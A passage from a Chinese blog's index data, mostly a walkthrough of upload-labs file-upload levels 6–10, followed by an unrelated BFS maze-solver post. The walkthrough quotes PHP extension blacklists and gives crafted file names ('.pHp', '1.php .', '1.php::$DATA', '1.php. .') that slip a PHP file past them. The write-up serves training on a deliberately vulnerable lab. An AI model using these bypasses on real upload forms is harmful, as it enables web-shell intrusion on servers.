&#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 仔细查看源码会发现少了下面的这段代码 $file_ext = strtolower($file_ext); //转换为小写 这里就可以大小写绕过。将文件后缀名改为.pHp , .PHP等 pass7$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 跟第六关对比发现少了这句话 $file_ext = trim($file_ext); //首尾去空 利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php pass8$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 这段代码少了这句话，可以与第六关相同的做法 $file_name = deldot($file_name);//删除文件名末尾的点 pass9$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 仔细观察发现少了这段代码 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA 采用Windows文件流特性绕过 将文件名改为 1.php::$DATA,但是实质上保存的文件还是1.php pass10$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 这一句代码是用来检测末尾是否是.，可以双写绕过。抓包将文件名改为1.php. . （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了","tags":[{"name":"MIME","slug":"MIME","permalink":"https://sunzhengyu99.github.io/tags/MIME/"},{"name":"大小写绕过","slug":"大小写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":".htaccess","slug":"htaccess","permalink":"https://sunzhengyu99.github.io/tags/htaccess/"},{"name":"windows文件特性","slug":"windows文件特性","permalink":"https://sunzhengyu99.github.io/tags/windows%E6%96%87%E4%BB%B6%E7%89%B9%E6%80%A7/"}]},{"title":"迷宫问题","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/迷宫问题/","text":"迷宫问题 原题题目描述 小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。 小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。 字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过 输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---##样例输出9解决代码#include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,intP; //坐标 int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向 int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标 int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=&#x27;#&#x27;&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]==&#x27;S&#x27;) //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]==&#x27;E&#x27;) //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]